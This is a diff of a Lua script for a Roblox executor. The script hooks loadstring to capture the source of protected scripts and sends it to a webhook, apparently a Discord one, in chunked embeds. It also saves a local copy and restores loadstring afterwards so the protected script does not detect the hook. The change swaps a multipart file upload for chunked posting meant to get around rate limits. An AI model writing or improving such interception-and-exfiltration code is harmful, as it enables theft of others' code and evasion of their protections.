@@ -52,16 +52,6 @@ local function _sendHttp(body, contentType)
 	if game and game.GetService then game:GetService("HttpService"):PostAsync(_W, body) end
 end
 
-local function _sendAsFile(s)
-	local boundary = "----Boundary" .. tostring(math.random(100000, 999999))
-	local header = "Content-Disposition: form-data; name=\"content\"\r\n\r\nCaptured source (" .. #s .. " chars) - full file attached.\r\n"
-	local filePart = "Content-Disposition: form-data; name=\"file\"; filename=\"source.lua\"\r\nContent-Type: text/plain\r\n\r\n"
-	local body = "--" .. boundary .. "\r\n" .. header .. "--" .. boundary .. "\r\n" .. filePart .. s .. "\r\n--" .. boundary .. "--\r\n"
-	return pcall(function()
-		_sendHttp(body, "multipart/form-data; boundary=" .. boundary)
-	end)
-end
-
 local _real = loadstring
 
 local function _send(s)
@@ -69,20 +59,33 @@ local function _send(s)
 	_n = _n + 1
 	(task and task.defer or spawn or function(f) f() end)(function()
 		pcall(function()
-			local sent = _sendAsFile(s)
-			if sent then
-				_post("[DEBUG] Sent full source as file (" .. #s .. " chars)")
-			elseif writefile then
+			-- Send in chunks like before so you at least get the full script,
+			-- even if Discord rate-limits after many messages.
+			local parts = math.ceil(#s / _maxChunk)
+			for i = 1, parts do
+				local chunk = s:sub((i - 1) * _maxChunk + 1, i * _maxChunk)
+				local title = parts > 1 and ("#%d (%d/%d)"):format(_n, i, parts) or ("#%d"):format(_n)
+				local body
+				if game and game.GetService then
+					local H = game:GetService("HttpService")
+					body = H:JSONEncode({
+						content = ("%d chars"):format(#s),
+						embeds = { { title = title, description = "```lua\n" .. chunk .. "\n```" } }
+					})
+				else
+					body = "{\"content\":\"" .. _escape(("%d chars"):format(#s)) .. "\",\"embeds\":[{\"title\":\"" .. _escape(title) .. "\",\"description\":\"" .. _escape("```lua\n" .. chunk .. "\n```") .. "\"}]}"
+				end
+				_sendHttp(body)
+				-- small delay every few messages to reduce hitting rate limits
+				if i % 5 == 0 then
+					if task and task.wait then task.wait(0.4) elseif wait then wait(0.4) end
+				end
+			end
+			-- Optional: also drop a copy into executor files if available
+			if writefile then
 				pcall(function() if makefolder then makefolder("static_content_130525") end end)
 				pcall(function() writefile("static_content_130525/source_captured.lua", s) end)
 				_post("[DEBUG] Saved to static_content_130525/source_captured.lua (" .. #s .. " chars)")
-			else
-				local chunk = s:sub(1, _maxChunk)
-				local body = game and game.GetService and game:GetService("HttpService") and game:GetService("HttpService"):JSONEncode({
-					content = "Full source " .. #s .. " chars - file/save failed. First " .. _maxChunk .. " chars:",
-					embeds = { { description = "```lua\n" .. chunk .. "\n```" } }
-				}) or "{\"content\":\"Full " .. #s .. " chars - no writefile\"}"
-				_sendHttp(body)
 			end
 			-- Anti-tamper: restore loadstring so protected script doesn't see our wrapper later
 			loadstring = _real
